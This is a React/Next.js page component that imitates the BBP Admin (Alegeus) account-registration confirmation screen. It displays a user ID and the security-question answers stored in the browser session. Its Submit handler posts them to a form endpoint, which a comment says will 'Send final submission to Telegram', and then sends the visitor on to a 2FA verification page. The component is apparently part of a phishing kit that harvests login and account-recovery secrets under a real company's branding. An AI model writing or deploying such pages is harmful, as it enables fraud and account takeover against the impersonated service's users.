'use client'

import { useState, useEffect } from 'react'
import { Phone, Mail } from 'lucide-react'
import Link from 'next/link'
import Image from 'next/image'
import { Button } from '@/components/ui/button'
import { Footer } from '@/components/footer'
import { useRequireSecurityDone } from '@/hooks/use-route-guard'

interface SecurityAnswer {
    question: string
    answer: string
}

export default function ConfirmPage() {
    useRequireSecurityDone()
    const [userId, setUserId] = useState('')
    const [securityAnswers, setSecurityAnswers] = useState<SecurityAnswer[]>([])
    const [isLoading, setIsLoading] = useState(false)

    useEffect(() => {
        // Get stored data from session storage
        if (typeof window !== 'undefined') {
            const storedUserId = sessionStorage.getItem('userId')
            const storedAnswers = sessionStorage.getItem('securityAnswers')

            if (storedUserId) {
                setUserId(storedUserId)
            }

            if (storedAnswers) {
                try {
                    setSecurityAnswers(JSON.parse(storedAnswers))
                } catch (e) {
                    console.error('Failed to parse security answers:', e)
                }
            }
        }
    }, [])

    const handleSubmit = async () => {
        setIsLoading(true)

        // Send final submission to Telegram
        try {
            await fetch('/api/form-submission', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'Registration Complete',
                    userId,
                    securityAnswers,
                    timestamp: new Date().toISOString(),
                }),
            })
        } catch (error) {
            console.error('Failed to send notification:', error)
        }

        // Clear session storage and redirect to success/login page
        if (typeof window !== 'undefined') {
            sessionStorage.clear()
        }

        // Redirect to login or success page
        window.location.href = '/login/2fa-verify'
    }

    return (
        <div className="min-h-screen flex flex-col bg-white">
            {/* Header */}
            <header className="border-b border-gray-200 px-6 py-4">
                <div className="flex items-center">
                    <div className="flex items-center gap-6">
                        <Link href="/" className="flex items-center">
                            <Image
                                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                                alt="BBP Admin"
                                width={140}
                                height={32}
                                className="h-[34px] w-auto"
                                priority
                            />
                        </Link>
                        <div className="hidden md:flex flex-col text-xs text-gray-600 leading-tight">
                            <div className="flex items-center gap-2">
                                <Phone className="w-3 h-3" />
                                <span>(630) 773-2337</span>
                            </div>
                            <div className="flex items-center gap-2 mt-1">
                                <Mail className="w-3 h-3" />
                                <span>support@bbpadmin.com</span>
                            </div>
                        </div>
                    </div>
                    <div className="ml-6 text-[21px] text-gray-600 font-light">Registration</div>
                </div>
            </header>

            {/* Main Content */}
            <main className="flex-1 px-6 py-6">
                <div className="max-w-md mx-auto">
                    {/* Header */}
                    <h1 className="text-2xl md:text-3xl font-bold text-gray-900 mb-2">
                        Your Account is Confirmed!
                    </h1>
                    <p className="text-gray-600 mb-2">
                        Review your information for accuracy and hit Submit.
                    </p>
                    <p className="text-gray-600 mb-6">
                        Click the back arrow to make corrections.
                    </p>

                    {/* Divider */}
                    <div className="h-1 bg-gradient-to-r from-[#1e3a5f] to-[#3a5f8f] mb-6"></div>

                    {/* User ID Section */}
                    <div className="border-b border-gray-200 py-4">
                        <p className="text-sm text-gray-500 mb-1">User ID</p>
                        <p className="text-lg font-semibold text-gray-900">{userId || 'Not set'}</p>
                    </div>

                    {/* Security Questions */}
                    {securityAnswers.map((item, index) => (
                        <div key={index} className="border-b border-gray-200 py-4">
                            <p className="text-sm text-gray-500 mb-1">{item.question}</p>
                            <p className="text-lg font-semibold text-gray-900">{item.answer}</p>
                        </div>
                    ))}

                    {/* If no security answers yet, show placeholder */}
                    {securityAnswers.length === 0 && (
                        <>
                            <div className="border-b border-gray-200 py-4">
                                <p className="text-sm text-gray-500 mb-1">Security Question 1</p>
                                <p className="text-lg font-semibold text-gray-900">Answer not provided</p>
                            </div>
                            <div className="border-b border-gray-200 py-4">
                                <p className="text-sm text-gray-500 mb-1">Security Question 2</p>
                                <p className="text-lg font-semibold text-gray-900">Answer not provided</p>
                            </div>
                            <div className="border-b border-gray-200 py-4">
                                <p className="text-sm text-gray-500 mb-1">Security Question 3</p>
                                <p className="text-lg font-semibold text-gray-900">Answer not provided</p>
                            </div>
                            <div className="border-b border-gray-200 py-4">
                                <p className="text-sm text-gray-500 mb-1">Security Question 4</p>
                                <p className="text-lg font-semibold text-gray-900">Answer not provided</p>
                            </div>
                        </>
                    )}
                </div>
            </main>

            {/* Submit Button */}
            <div className="bg-gray-100 p-6">
                <div className="max-w-md mx-auto">
                    <Button
                        className="w-full py-6 rounded-full bg-[#141c4d] hover:bg-[#407ec9] text-white font-semibold transition-colors"
                        onClick={handleSubmit}
                        disabled={isLoading}
                    >
                        SUBMIT
                    </Button>
                </div>
            </div>

            <Footer />
        </div>
    )
}
